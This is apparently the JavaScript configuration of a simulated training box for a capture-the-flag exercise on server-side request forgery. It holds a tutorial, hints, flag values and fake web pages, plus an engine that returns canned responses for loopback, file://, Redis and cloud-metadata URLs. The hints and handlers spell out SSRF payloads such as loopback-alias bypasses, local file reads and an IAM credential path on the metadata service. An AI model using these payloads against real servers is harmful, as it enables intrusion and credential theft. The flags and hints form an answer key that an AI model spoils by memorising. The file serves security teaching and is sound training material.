/* ============================================================
   CTF ARENA — Box A10: The Glass Tunnel
   Server-Side Request Forgery (SSRF) | Glass Corridor
   Config: URL inspection engine, internal services, filesystem, flags, hints, lore
   ============================================================ */

const A10Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Glass Tunnel',
    subtitle: 'Server-Side Request Forgery — Glass Corridor',

    // Tutorial mode (AR-12)
    tutorialMode: true,
    tutorial: {
            "steps": [
                    {
                            "title": "Reconnaissance",
                            "tip": "Start by scanning the target with nmap to discover services and potential attack vectors.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "cmd": "contains:nmap"
                                    }
                            }
                    },
                    {
                            "title": "Explore the target",
                            "tip": "Investigate the services you found. Browse web apps, check service versions, read documentation.",
                            "trigger": {
                                    "event": "navigate",
                                    "alt": [
                                            {
                                                    "event": "command",
                                                    "match": {
                                                            "phase": "RECON"
                                                    }
                                            }
                                    ]
                            }
                    },
                    {
                            "title": "Find the vulnerability",
                            "tip": "Look for misconfigurations, weak inputs, or known CVEs in the services you discovered.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "phase": "EXPLOIT"
                                    }
                            }
                    },
                    {
                            "title": "Capture the user flag",
                            "tip": "Exploit the vulnerability to gain initial access and retrieve the user flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "user"
                                    }
                            }
                    },
                    {
                            "title": "Escalate to root",
                            "tip": "Use what you found to escalate privileges and capture the root flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "root"
                                    }
                            }
                    }
            ]
    },
    difficulty: 'Intermediate-Advanced',
    accent: '#2c3e50',
    storageKey: 'hexworth_ctf_a10',
    trackerKey: 'ctf_a10',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Discover the target\'s attack surface. Identify open ports, running services, and exposed endpoints.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002'],
            unlocks: ['enumeration'],
            locked: false
        },
        {
            id: 'enumeration',
            name: 'Web Enumeration',
            icon: '\uD83C\uDF10',
            description: 'Explore the web application. Locate the URL-fetching functionality and understand how the server processes external requests.',
            requiredFlags: [],
            mitre: ['T1190', 'T1592.004'],
            unlocks: ['exploitation'],
            locked: true
        },
        {
            id: 'exploitation',
            name: 'SSRF Exploitation',
            icon: '\uD83D\uDC89',
            description: 'Abuse the server-side request functionality to reach internal services not accessible from the public network.',
            requiredFlags: ['user'],
            mitre: ['T1190', 'T1090'],
            unlocks: ['exfiltration'],
            locked: true
        },
        {
            id: 'exfiltration',
            name: 'Internal Pivot / Data Exfiltration',
            icon: '\uD83D\uDCC2',
            description: 'Pivot deeper into the internal network. Extract cached credentials and configuration secrets from internal services.',
            requiredFlags: ['root'],
            mitre: ['T1530', 'T1213'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'SSRF Internal Service Discovery' },
            { flagId: 'user', objective: '1.3', description: 'Given a scenario, analyze indicators associated with application attacks — SSRF', skill: 'Loopback Filter Bypass via SSRF' },
            { flagId: 'user', objective: '4.1', description: 'Given a scenario, apply the appropriate tool to assess organizational security — web app security', skill: 'URL Parameter Abuse for SSRF' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'SSRF Pivot to Internal Admin Panel' },
            { flagId: 'root', objective: '3.2', description: 'Given a scenario, implement secure protocols and network architecture — access control', skill: 'Internal Redis Credential Exposure via SSRF' },
            { flagId: 'root', objective: '2.5', description: 'Given a scenario, analyze indicators associated with application attacks — injection', skill: 'Cloud Metadata Exfiltration via SSRF' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.14.32\n'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', value: 'flag{gl4ss_tunn3l_ssrf_1nt3rn4l}', points: 100 },
        { id: 'root', value: 'flag{gl4ss_c0rr1d0r_r3d1s_r00t}',  points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 }   // 15 minutes
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: "The URL inspector fetches URLs server-side. What happens if you point it at internal services? Check /corridor/status/ for the internal service ports.",
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: "Try http://127.0.0.1:8080/ — the server can access its own internal admin panel even though you cannot reach it directly from your Kali machine.",
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: "The service also supports file:// protocol. Try file:///etc/passwd to confirm local file read capability, then file:///home/corridor/user.txt for the user flag.",
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: "Redis is running on port 6379. SSRF to http://127.0.0.1:6379/ exposes the cache contents. The root flag is stored under the key config:master_key.",
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Glass Corridor is a link inspector service used by the Vantablack Syndicate to audit outbound traffic. It fetches any URL server-side and returns a structured inspection report. Intelligence confirms it runs unauthenticated internal services on loopback — hidden from the public network but reachable through the inspector itself. Your mission: use the Corridor\'s own transparency against it.',
        scenario: 'A mid-size proxy network vendor shipped the Glass Corridor as a "DevOps diagnostic tool" — never intended for production. When the Vantablack Syndicate\'s operations team needed a quick link validator, they deployed it without security review. The block-list was copy-pasted from a blog post. Nobody thought to include 127.0.0.1.',
        outro: 'The Glass Tunnel has shattered. The Corridor\'s transparent proxy — designed to watch others — became the very opening that let you peer inward. Internal admin panels, cached credentials, cloud metadata: all exposed through a server that trusted itself too much.',
        ecer: {
            executive: 'Operations leadership deployed a diagnostic tool as a production service without architectural review or threat modeling',
            culture: 'No application security gate in the deployment pipeline; block-lists treated as security controls rather than defense-in-depth',
            employee: 'Developer never validated that loopback bypass was possible; copy-pasted block-list excluded 127.0.0.1 and all alias forms',
            regulatory: 'No web application firewall, no SSRF-specific controls, and no network segmentation review required before deployment'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — The Glass Corridor
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.32/corridor/',

        pages: {

            // ── Page 1: Main URL Inspector ──────────────────────
            '/corridor/': {
                title: 'Glass Corridor — Link Inspector',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ccd;">
                        <h1 style="color:#2c3e50; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">&#9670; Glass Corridor</h1>
                        <div style="color:#888; font-size:0.78rem;">Link Inspector &mdash; Transparent Proxy Network v3.0.1</div>
                    </div>

                    <div style="max-width:620px; margin:0 auto 24px;">
                        <label style="display:block; color:#2c3e50; font-size:0.8rem; font-weight:600; margin-bottom:6px; letter-spacing:0.05em;">URL INSPECTION</label>
                        <p style="color:#666; font-size:0.78rem; margin:0 0 12px;">Enter any URL to inspect its HTTP headers and content preview. The Corridor fetches the target server-side and returns a structured report.</p>
                        <div style="display:flex; gap:8px; align-items:stretch;">
                            <input type="text" data-field="url"
                                   placeholder="https://example.com or http://target/path"
                                   style="flex:1; padding:9px 14px; border:1px solid #b0b8c8; border-radius:4px; font-family:monospace; font-size:0.82rem; color:#2c3e50;">
                            <button data-action="inspect"
                                    style="padding:9px 22px; background:#2c3e50; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; font-size:0.82rem; cursor:pointer; letter-spacing:0.05em;">Inspect</button>
                        </div>
                    </div>

                    <div data-results style="max-width:700px; margin:0 auto;">
                        <div style="color:#aab; font-size:0.72rem; letter-spacing:0.1em; margin-bottom:8px;">INSPECTION RESULTS WILL APPEAR HERE</div>
                        <div style="background:#f8f9fb; border:1px solid #dde; border-radius:4px; padding:14px; color:#888; font-size:0.8rem; font-style:italic;">
                            No URL submitted yet. Enter a URL above and click Inspect.
                        </div>
                    </div>
                `,
                formHandler: function(data, engine) {
                    return A10Config._handleInspect(data.url || '', engine);
                }
            },

            // ── Page 2: Service Status ───────────────────────────
            '/corridor/status/': {
                title: 'Glass Corridor — Service Status',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ccd;">
                        <h1 style="color:#2c3e50; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">&#9670; Glass Corridor</h1>
                        <div style="color:#888; font-size:0.78rem;">Service Status &mdash; Public Dashboard</div>
                    </div>

                    <div style="max-width:680px; margin:0 auto;">
                        <div style="color:#2c3e50; font-size:0.78rem; font-weight:700; letter-spacing:0.1em; margin-bottom:16px; padding-bottom:6px; border-bottom:1px solid #eef;">EXTERNAL SERVICES</div>

                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem; margin-bottom:28px;">
                            <thead>
                                <tr style="background:#eef1f6;">
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Service</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Endpoint</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Status</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Link Inspector</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">10.10.14.32:80/corridor/</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">&#9679; Operational</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Status Page</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">10.10.14.32:80/corridor/status/</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">&#9679; Operational</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">API Docs</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">10.10.14.32:80/corridor/docs/</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">&#9679; Operational</td>
                                </tr>
                            </tbody>
                        </table>

                        <div style="color:#2c3e50; font-size:0.78rem; font-weight:700; letter-spacing:0.1em; margin-bottom:16px; padding-bottom:6px; border-bottom:1px solid #eef;">INTERNAL SERVICES <span style="font-weight:400; color:#999; font-size:0.72rem;">&mdash; not accessible from public network</span></div>

                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                            <thead>
                                <tr style="background:#eef1f6;">
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Service</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Internal Port</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Description</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Access</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Internal Admin</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">127.0.0.1:8080</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#666;">Corridor operator panel and system dashboard</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#c0392b; font-size:0.72rem; font-weight:700;">INTERNAL ONLY</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Cache Layer</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">127.0.0.1:6379</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#666;">Redis session and configuration cache</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#c0392b; font-size:0.72rem; font-weight:700;">INTERNAL ONLY</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Search Index</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">127.0.0.1:9200</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#666;">Elasticsearch index for proxy log analysis</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#c0392b; font-size:0.72rem; font-weight:700;">INTERNAL ONLY</td>
                                </tr>
                            </tbody>
                        </table>

                        <div style="margin-top:20px; padding:12px 14px; background:#f8f9fb; border:1px solid #dde; border-radius:4px; font-size:0.75rem; color:#888;">
                            Last updated: 2024-11-14 03:17:09 UTC &mdash; All external services nominal. Internal services not reachable from public IP range.
                        </div>
                    </div>
                `
            },

            // ── Page 3: API Documentation ─────────────────────────
            '/corridor/docs/': {
                title: 'Glass Corridor — API Documentation',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ccd;">
                        <h1 style="color:#2c3e50; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">&#9670; Glass Corridor</h1>
                        <div style="color:#888; font-size:0.78rem;">API Documentation &mdash; Link Inspector v3.0.1</div>
                    </div>

                    <div style="max-width:680px; margin:0 auto; font-size:0.82rem; color:#444; line-height:1.7;">

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px; margin-top:0;">Endpoint</h2>
                        <p>All inspection requests are submitted as POST to the inspector form on the main page. The <code style="background:#eef1f6; padding:1px 5px; border-radius:3px; font-size:0.78rem;">url</code> parameter accepts any well-formed URL.</p>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">Supported Protocols</h2>
                        <table style="width:100%; border-collapse:collapse; font-size:0.78rem; margin-bottom:16px;">
                            <thead>
                                <tr style="background:#eef1f6;">
                                    <th style="padding:6px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Protocol</th>
                                    <th style="padding:6px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Support</th>
                                    <th style="padding:6px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Notes</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">http://</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">Supported</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; color:#666;">Standard HTTP fetch with redirect following</td>
                                </tr>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">https://</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">Supported</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; color:#666;">TLS verification enabled by default</td>
                                </tr>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">file://</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">Supported</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; color:#666;">Local filesystem reads — for diagnostic use</td>
                                </tr>
                            </tbody>
                        </table>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">Security Controls</h2>
                        <p>The following address ranges are blocked to prevent unauthorized access to internal infrastructure:</p>
                        <ul style="margin:0 0 16px; padding-left:20px; color:#555;">
                            <li style="margin-bottom:4px;"><code style="background:#eef1f6; padding:1px 5px; border-radius:3px; font-size:0.78rem;">10.0.0.0/8</code> — Private RFC-1918 range (blocked)</li>
                            <li style="margin-bottom:4px;"><code style="background:#eef1f6; padding:1px 5px; border-radius:3px; font-size:0.78rem;">172.16.0.0/12</code> — Private RFC-1918 range (blocked)</li>
                            <li style="margin-bottom:4px;"><code style="background:#eef1f6; padding:1px 5px; border-radius:3px; font-size:0.78rem;">192.168.0.0/16</code> — Private RFC-1918 range (blocked)</li>
                        </ul>
                        <div style="padding:10px 14px; background:#fff8e1; border:1px solid #ffe082; border-radius:4px; font-size:0.75rem; color:#7a6200; margin-bottom:16px;">
                            <strong>Note:</strong> The block-list applies to the first-hop URL only. Redirects are followed without re-validation. Loopback addresses (127.0.0.x) and link-local ranges are not included in the block-list as they are considered host-local.
                        </div>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">Response Format</h2>
                        <p>Each inspection returns a structured report including status code, response headers, and a content snippet (first 2KB).</p>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">Version History</h2>
                        <ul style="color:#666; margin:0; padding-left:20px;">
                            <li>v3.0.1 — Added file:// support for local diagnostics</li>
                            <li>v3.0.0 — Redirect following enabled by default</li>
                            <li>v2.1.0 — Block-list introduced for RFC-1918 ranges</li>
                            <li>v1.0.0 — Initial release</li>
                        </ul>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // SSRF ENGINE — URL Inspection Handler
    // Simulates server-side URL fetching with SSRF vulnerabilities
    // ═══════════════════════════════════════════════════════

    _handleInspect(rawUrl, engine) {
        if (!rawUrl || !rawUrl.trim()) {
            return A10Config._inspectError('No URL provided. Enter a URL to inspect.');
        }

        const url = rawUrl.trim();

        // ── Block direct 10.x.x.x access (simulated server-side filter) ──
        // Note: this only blocks 10.x.x.x — localhost/127.0.0.1 bypasses it intentionally
        if (/^https?:\/\/10\.\d+\.\d+\.\d+/.test(url)) {
            return A10Config._inspectError('Error: Internal network addresses in the 10.0.0.0/8 range are blocked by the security policy.');
        }

        // ── Normalize the URL for matching ──
        const lower = url.toLowerCase();

        // ── file:// protocol handlers ──────────────────────
        if (lower.startsWith('file://')) {
            return A10Config._handleFileRead(url.slice(7));
        }

        // ── Cloud metadata: AWS IMDSv1 ─────────────────────
        if (lower.includes('169.254.169.254')) {
            return A10Config._handleAwsMetadata(url);
        }

        // ── Internal admin panel — port 8080 ──────────────
        // Accepts: localhost, 127.0.0.1, 0.0.0.0, 0x7f000001, 2130706433
        if (A10Config._isLoopback(lower) && (lower.includes(':8080') || lower.includes('8080/'))) {
            if (lower.includes('/admin') || lower.includes('/api')) {
                return A10Config._handleAdminApi(url);
            }
            return A10Config._handleAdminPanel(url);
        }

        // ── Redis — port 6379 ──────────────────────────────
        if (A10Config._isLoopback(lower) && lower.includes('6379')) {
            return A10Config._handleRedis(url);
        }

        // ── Elasticsearch — port 9200 ──────────────────────
        if (A10Config._isLoopback(lower) && lower.includes('9200')) {
            return A10Config._handleElastic(url);
        }

        // ── Generic loopback (no specific port matched) ────
        if (A10Config._isLoopback(lower)) {
            return A10Config._handleLoopbackGeneric(url);
        }

        // ── Self-reference: the corridor itself ───────────
        if (lower.includes('10.10.14.32') && lower.includes('/corridor')) {
            return A10Config._handleSelfReference(url);
        }

        // ── External URLs (fallback) ───────────────────────
        return A10Config._handleExternal(url);
    },

    // Returns true for all loopback/alias forms that bypass the block filter
    _isLoopback(lower) {
        return lower.includes('127.0.0.1') ||
               lower.includes('localhost') ||
               lower.includes('0.0.0.0') ||
               lower.includes('0x7f000001') ||
               lower.includes('2130706433') ||
               lower.includes('127.1') ||
               lower.includes('[::1]');
    },

    // ── Handler: Internal Admin Panel (127.0.0.1:8080/) ──────────────────────
    _handleAdminPanel(url) {
        return A10Config._inspectSuccess(url, 200, 'text/html', `<!DOCTYPE html>
<html>
<head><title>Corridor Admin — Internal</title></head>
<body>
<h1 style="color:#c0392b;"><img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Internal Admin Panel &mdash; Glass Corridor</h1>
<table border="1" cellpadding="4" style="border-collapse:collapse;">
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>Status</td><td style="color:green;"><b>Active</b></td></tr>
  <tr><td>Operator</td><td>corridor_admin</td></tr>
  <tr><td>Version</td><td>3.0.1-internal</td></tr>
  <tr><td>User Flag</td><td style="color:green; font-weight:bold; font-family:monospace;">flag{gl4ss_tunn3l_ssrf_1nt3rn4l}</td></tr>
</table>
<hr>
<p><b>Internal Services:</b></p>
<ul>
  <li>admin: 127.0.0.1:8080</li>
  <li>redis: 127.0.0.1:6379</li>
  <li>elastic: 127.0.0.1:9200</li>
</ul>
<p><a href="/admin/api/config">API Config</a> | <a href="/admin/logs">Access Logs</a></p>
</body>
</html>`);
    },

    // ── Handler: Admin API/Config endpoint ────────────────────────────────────
    _handleAdminApi(url) {
        return A10Config._inspectSuccess(url, 200, 'application/json', `{
  "service": "corridor-admin-api",
  "version": "3.0.1",
  "build": "2024-11-01T09:12:44Z",
  "operator": "corridor_admin",
  "config": {
    "redis_host": "127.0.0.1:6379",
    "elastic_host": "127.0.0.1:9200",
    "log_path": "/var/log/corridor/access.log",
    "session_secret": "gl4ss_c0rr1d0r_s3cr3t_k3y_2024",
    "allow_file_reads": true,
    "ssrf_blocklist": ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
  },
  "user_flag": "flag{gl4ss_tunn3l_ssrf_1nt3rn4l}",
  "note": "Loopback bypass via SSRF successful. The admin API is fully exposed."
}`);
    },

    // ── Handler: Redis on 127.0.0.1:6379 ─────────────────────────────────────
    _handleRedis(url) {
        return A10Config._inspectRaw(url, `+OK Redis 6.2.6 (Glasscorridor Build)
* Server is ready to accept connections on 127.0.0.1:6379

> KEYS *
1) "session:admin"
2) "session:corridor_user_4421"
3) "config:master_key"
4) "config:session_ttl"
5) "cache:inspector_results"
6) "rate:10.10.14.32"

> GET session:admin
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY29ycmlkb3JfYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.redacted"

> GET config:master_key
"flag{gl4ss_c0rr1d0r_r3d1s_r00t}"

> GET config:session_ttl
"86400"

NOTE: Redis is bound to 127.0.0.1 only. Access via SSRF through the Link Inspector.`);
    },

    // ── Handler: Elasticsearch on 127.0.0.1:9200 ─────────────────────────────
    _handleElastic(url) {
        return A10Config._inspectSuccess(url, 200, 'application/json', `{
  "name": "glass-corridor-node-01",
  "cluster_name": "corridor-logs",
  "cluster_uuid": "A9tVBjcqR_OpVJpLkW_KuQ",
  "version": {
    "number": "8.11.1",
    "build_flavor": "default"
  },
  "tagline": "You Know, for Search",
  "_indices": {
    "corridor-access-logs": { "docs": 198442, "status": "green" },
    "corridor-inspector-results": { "docs": 34112, "status": "green" },
    "corridor-internal-events": { "docs": 9201, "status": "green" }
  },
  "_note": "Elasticsearch bound to 127.0.0.1. Reachable via SSRF only. Use /_cat/indices and /_search for enumeration."
}`);
    },

    // ── Handler: Generic loopback (no port matched) ───────────────────────────
    _handleLoopbackGeneric(url) {
        return A10Config._inspectSuccess(url, 200, 'text/html', `<!DOCTYPE html>
<html>
<head><title>Glass Corridor — Loopback</title></head>
<body>
<h2>Loopback Interface</h2>
<p>You have reached the host's loopback interface. Listening services:</p>
<ul>
  <li>:80  — HTTP (public corridor app)</li>
  <li>:8080 — Internal Admin Panel</li>
  <li>:6379 — Redis Cache</li>
  <li>:9200 — Elasticsearch</li>
</ul>
<p>Specify a port to access a service.</p>
</body>
</html>`);
    },

    // ── Handler: Self-reference to the corridor ────────────────────────────────
    _handleSelfReference(url) {
        return A10Config._inspectSuccess(url, 200, 'text/html',
            '<!DOCTYPE html><html><head><title>Glass Corridor</title></head><body><h1>&#9670; Glass Corridor</h1><p>Link Inspector v3.0.1 — self-reference detected. The server can inspect itself.</p></body></html>');
    },

    // ── Handler: AWS IMDS (cloud metadata) ────────────────────────────────────
    _handleAwsMetadata(url) {
        const lower = url.toLowerCase();

        if (lower.includes('iam/security-credentials/glasscorridorrole') ||
            lower.includes('iam/security-credentials/glass-corridor-role')) {
            return A10Config._inspectRaw(url, `{
  "Code": "Success",
  "LastUpdated": "2024-11-14T03:11:02Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoXnyc4lcK4w4OIaYnuFg...(truncated)",
  "Expiration": "2024-11-14T09:11:02Z"
}`);
        }

        if (lower.includes('iam/security-credentials')) {
            return A10Config._inspectRaw(url, `GlassCorridorRole`);
        }

        if (lower.includes('iam')) {
            return A10Config._inspectRaw(url, `security-credentials/`);
        }

        if (lower.includes('latest/meta-data/iam')) {
            return A10Config._inspectRaw(url, `security-credentials/`);
        }

        if (lower.includes('latest/meta-data')) {
            return A10Config._inspectRaw(url, `ami-id
hostname
instance-id
instance-type
local-hostname
local-ipv4
mac
placement/
public-hostname
public-ipv4
reservation-id
security-groups
iam/`);
        }

        // Root metadata endpoint
        return A10Config._inspectRaw(url, `latest/
latest/meta-data/
latest/user-data/
latest/dynamic/`);
    },

    // ── Handler: file:// local file reads ─────────────────────────────────────
    _handleFileRead(filePath) {
        // Normalize path (strip leading slash if doubled)
        const path = filePath.startsWith('/') ? filePath : '/' + filePath;

        if (path === '/etc/passwd') {
            return A10Config._inspectRaw('file:///etc/passwd', `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
corridor:x:1001:1001:Glass Corridor Service:/home/corridor:/bin/bash
redis:x:999:999:Redis Server:/var/lib/redis:/usr/sbin/nologin
elasticsearch:x:998:998:Elasticsearch:/var/lib/elasticsearch:/usr/sbin/nologin
kali:x:1000:1000:Kali:/home/kali:/bin/bash`);
        }

        if (path === '/etc/hosts') {
            return A10Config._inspectRaw('file:///etc/hosts', `127.0.0.1  localhost
127.0.1.1  glass-corridor
10.10.14.32  glass-corridor.ctf.local
::1        localhost ip6-localhost ip6-loopback`);
        }

        if (path === '/home/corridor/user.txt') {
            return A10Config._inspectRaw('file:///home/corridor/user.txt',
                'flag{gl4ss_tunn3l_ssrf_1nt3rn4l}');
        }

        if (path === '/root/root.txt') {
            return A10Config._inspectError('file:///root/root.txt: Permission denied (errno 13). The process runs as user "corridor" — root files are not accessible via file read. Try another approach.');
        }

        if (path.includes('/var/log/corridor') || path.includes('/corridor/access.log')) {
            return A10Config._inspectRaw('file:///var/log/corridor/access.log', `10.10.14.50 - - [14/Nov/2024:02:11:03 +0000] "POST /corridor/ HTTP/1.1" 200 1842 url=https://example.com
10.10.14.50 - - [14/Nov/2024:02:11:19 +0000] "POST /corridor/ HTTP/1.1" 200 892 url=http://127.0.0.1:8080/
10.10.14.50 - - [14/Nov/2024:02:12:44 +0000] "POST /corridor/ HTTP/1.1" 200 408 url=file:///etc/passwd
10.10.14.50 - - [14/Nov/2024:02:14:01 +0000] "POST /corridor/ HTTP/1.1" 200 312 url=http://127.0.0.1:6379/`);
        }

        if (path.includes('/etc/shadow')) {
            return A10Config._inspectError('file:///etc/shadow: Permission denied (errno 13). Shadow file requires root access.');
        }

        // Generic file not found
        return A10Config._inspectError(`file://${path}: No such file or directory (errno 2).`);
    },

    // ── Handler: External URLs ────────────────────────────────────────────────
    _handleExternal(url) {
        // Extract hostname for display
        let host = url;
        try {
